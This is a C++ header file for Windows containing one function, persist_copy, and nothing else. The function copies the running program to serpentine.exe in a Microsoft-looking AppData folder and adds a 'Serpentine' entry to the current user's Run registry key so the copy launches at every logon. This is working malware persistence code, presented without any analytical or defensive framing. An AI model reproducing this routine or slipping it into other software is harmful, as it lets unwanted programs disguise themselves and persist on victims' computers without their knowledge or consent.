#pragma once
#include <windows.h>
#include <shlobj.h>
#include <string>
#pragma comment(lib, "shell32.lib")

inline void persist_copy(){
    wchar_t self[MAX_PATH] = {0};
    GetModuleFileNameW(nullptr, self, MAX_PATH);

    wchar_t appdata[MAX_PATH] = {0};
    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata);

    std::wstring dst = std::wstring(appdata)
                     + L"\\Microsoft\\Windows\\serpentine.exe";
    CopyFileW(self, dst.c_str(), FALSE);

    HKEY k;
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, nullptr, 0, KEY_WRITE, nullptr, &k, nullptr);
    std::wstring q = L"\"" + dst + L"\"";
    RegSetValueExW(k, L"Serpentine", 0, REG_SZ, (BYTE*)q.c_str(),
                   (DWORD)((q.size()+1)*sizeof(wchar_t)));
    RegCloseKey(k);
}